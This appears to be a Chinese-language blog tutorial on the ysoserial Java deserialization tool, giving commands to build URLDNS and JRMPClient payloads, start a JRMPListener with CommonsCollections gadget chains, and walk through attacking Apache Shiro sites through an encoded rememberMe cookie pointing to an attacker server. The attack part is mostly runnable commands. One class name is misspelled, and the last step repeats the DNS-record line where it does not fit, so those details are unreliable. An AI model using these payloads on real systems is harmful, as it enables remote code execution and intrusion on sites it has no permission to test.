---
title: ysoserial
auther: Creexile
date: 2025-08-03
lastMod: 2026-02-09
summary: 'Java反序列化工具'
cover: ''
category: '工具'
draft: false
comments: false
sticky: 0
tags: []
---

ysoserial是在常见的java库中发现的一组实用程序和面向属性的编程“小工具链”，在适当的条件下，可以利用执行对象不安全反序列化的Java应用程序。

# 地址

ysoserial项目地址：[github-ysoserial](https://github.com/frohoff/ysoserial)

# 使用

两种方式, 一种是生成payload, 一种是执行exp

## 生成payload

```bash
# 生成dnslog链的payload
java -jar ysoserial.jar URLDNS http://xxx.dns.log
java -jar ysoserial.jar URLDNS http://xxx.dns.log > /tmp/urldns.ser

# 连接特定ip和端口jrmp
java -jar ysoserial.jar JRMPClient "127.0.0.1:9999" > /tmp/jrmp.ser
```

## 执行exp

一般用于开启交互服务, 可以在`ysoserial-all\ysoserial\exploit`目录下看到

```bash
# 特定端口启用特定监听, 利用特定链执行特定命令
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 'whoami'
```

> java命令的`-cp`参数和`-classpath`参数是一样的，即指定类运行所依赖类路径、通常是类库和jar包。而java命令的`-jar`参数则直接执行jar包里面`META-INF\MANIFEST.MF`文件中指定的Main-Class

# 解释

## JRMP

`JRMP（Java Remote Method Protocol）`是Java远程方法调用协议的缩写。它是Java中用于实现分布式对象通信的一种协议。

在Java中，可以通过远程方法调用`（Remote Method Invocation，RMI）`来实现不同Java虚拟机（JVM）之间的通信

JRMP是RMI中的默认协议，它定义了在Java平台上进行远程方法调用所使用的协议规范

# 实例

## 生成payload

使用 ysoserial，生成一个 URLDNS 序列化 payload：

```bash
java -jar ysoserial.jar URLDNS http://... > /tmp/urldns.ser
```

用 shiro 编码脚本将序列化 payload 进行编码，得到 Cookie 字符串：

```
java -jar shiro-exp.jar encrypt /tmp/urldns.ser
```

再将上面得到的 Cookie 字符串作为 rememberMe Cookie 的值，发送到目标网站，如果 cipher key 正确，将收到 dns 解析记录

## 执行exp

攻击者先在公网 vps 上用 ysoserial 启一个恶意的 JRMPListener，监听在 19999 端口，并指定使用 CommonsCollections6 模块，要让目标执行的命令为 ping 一个域名

```bash
java -cp ysoserial.jar ysoserial.expeseloit.JRMPListener 19999 CommonsCollections6 "ping www.baidu.com"
```

然后用 ysoserial 生成 JRMPClient 的序列化 payload，指向上一步监听的地址和端口（假如攻击者服务器 ip 地址为 1.1.1.1）：

```bash
java -jar ysoserial.jar JRMPClient "1.1.1.1:19999" > /tmp/jrmp.ser
```

再用 shiro 编码脚本对 JRMPClient payload 进行编码：

```bash
java -jar shiro-exp.jar encrypt /tmp/jrmp.ser
```

再将上面得到的 Cookie 字符串作为 rememberMe Cookie 的值，发送到目标网站，如果 cipher key 正确，将收到 dns 解析记录
